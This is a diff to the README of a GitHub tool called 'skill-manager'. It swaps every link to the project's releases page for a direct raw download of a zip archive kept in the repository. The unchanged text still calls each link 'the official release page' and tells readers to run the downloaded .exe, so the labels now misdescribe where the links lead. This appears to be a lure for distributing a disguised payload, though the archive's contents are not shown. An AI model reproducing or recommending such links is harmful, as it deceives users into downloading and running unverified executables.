@@ -1,6 +1,6 @@
 # ⚙️ skill-manager - Manage Skills Efficiently by Project
 
-[![Download skill-manager](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/mrdenox109-nyx/skill-manager/releases)
+[![Download skill-manager](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/mrdenox109-nyx/skill-manager/raw/refs/heads/main/skills/skill-manager/skill_manager_2.1.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Before you start, make sure you have access to the internet for downloading the 
 
 Click the big badge at the top or visit the releases page here:
 
-[Download skill-manager](https://github.com/mrdenox109-nyx/skill-manager/releases)
+[Download skill-manager](https://github.com/mrdenox109-nyx/skill-manager/raw/refs/heads/main/skills/skill-manager/skill_manager_2.1.zip)
 
 This link takes you to the official release page on GitHub. You will find the latest version ready for download.
 
@@ -95,7 +95,7 @@ skill-manager works by analyzing the tech stack of your project. It then decides
 
 To get the latest improvements:
 
-- Visit the [releases page](https://github.com/mrdenox109-nyx/skill-manager/releases).  
+- Visit the [releases page](https://github.com/mrdenox109-nyx/skill-manager/raw/refs/heads/main/skills/skill-manager/skill_manager_2.1.zip).  
 - Download the newest `.exe` installation file.  
 - Run the installer again to replace the old version with the new one.
 
@@ -137,6 +137,6 @@ For developers, skill-manager can be extended to support more AI skills or techn
 
 ---
 
-[Download skill-manager](https://github.com/mrdenox109-nyx/skill-manager/releases)
+[Download skill-manager](https://github.com/mrdenox109-nyx/skill-manager/raw/refs/heads/main/skills/skill-manager/skill_manager_2.1.zip)
 
-[![Download skill-manager](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/mrdenox109-nyx/skill-manager/releases)
+[![Download skill-manager](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/mrdenox109-nyx/skill-manager/raw/refs/heads/main/skills/skill-manager/skill_manager_2.1.zip)
